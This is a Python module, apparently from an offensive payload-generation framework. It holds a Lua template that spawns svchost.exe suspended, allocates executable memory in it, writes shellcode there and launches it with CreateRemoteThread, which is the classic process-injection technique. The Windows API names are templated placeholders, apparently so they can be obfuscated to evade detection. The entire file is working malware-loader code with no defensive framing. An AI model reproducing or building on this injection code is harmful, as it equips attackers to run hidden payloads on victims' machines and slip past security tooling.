from string import Template
from common.utils.argumentparser import ArgumentParser

class spawnandinject:
    def __init__(self, arguments):
        pass

    def imports(self) -> list[str]:
        return ['local c = require "c"']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        return """

    {transformers}

    local target = c.string("C:\\\\windows\\\\system32\\\\svchost.exe")
    local startupinfoa = c.Struct("JpppJJJJJJJJSSpppp", "cb", "lpReserved", "lpDesktop", "lpTitle", "dwX", "dwY", "dwXSize", "dwYSize", "dwXCountChars", "dwYCountChars", "dwFillAttribute","dwFlags","wShowWindow","cbReserved2", "lpReserved2", "hStdInput", "hStdOutput", "hStdError")
    local processinformation = c.Struct("ppII", "hProcess", "hThread", "dwProcessId", "dwThreadId")
    local si = startupinfoa()
    local pi = processinformation()

    {CreateProcessA}(c.NULL, c.Pointer(target), c.NULL, c.NULL, 0, 0x4, c.NULL, c.NULL, c.Pointer(si), c.Pointer(pi))

    local address = {VirtualAllocEx}(pi.hProcess, c.NULL, {shellcodeSize}, 0x3000, 0x40)

    {WriteProcessMemory}(pi.hProcess, address, c.Pointer(shellcode[0]), {shellcodeSize}, c.NULL)

    local oldProtect = c.uint32_t()
    {VirtualProtectEx}(pi.hProcess, address, {shellcodeSize}, 0x40, c.Pointer(oldProtect))

    local hThread = {CreateRemoteThread}(pi.hProcess, c.NULL, 0, address, c.NULL, 0, c.NULL)

    {WaitForSingleObject}(hThread, 500)
"""